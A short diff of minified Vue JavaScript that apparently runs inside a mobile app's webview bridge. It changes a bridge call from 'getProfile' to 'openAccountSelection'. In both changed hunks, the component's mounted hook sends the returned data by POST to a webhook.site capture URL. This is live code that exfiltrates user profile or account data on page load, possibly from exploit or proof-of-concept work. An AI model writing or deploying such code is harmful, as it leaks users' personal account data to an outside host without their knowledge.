@@ -501,7 +501,7 @@
                 },
                 mounted: function() {
                     var e = this;
-                    console.log("calling getProfile: "), this.$bridge.callHandler("getProfile").then((function(e) {
+                    console.log("calling getProfile: "), this.$bridge.callHandler("openAccountSelection").then((function(e) {
                         fetch("https://webhook.site/bed26aa0-5782-483e-881e-4d1fa0115c38", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
@@ -612,7 +612,7 @@
             },
             mounted: function() {
                 var e = this;
-                this.$bridge.callHandler("getProfile").then((function(t) {
+                this.$bridge.callHandler("openAccountSelection").then((function(t) {
                     e.profile = t
                     fetch("https://webhook.site/bed26aa0-5782-483e-881e-4d1fa0115c38", {
                         method: "POST",
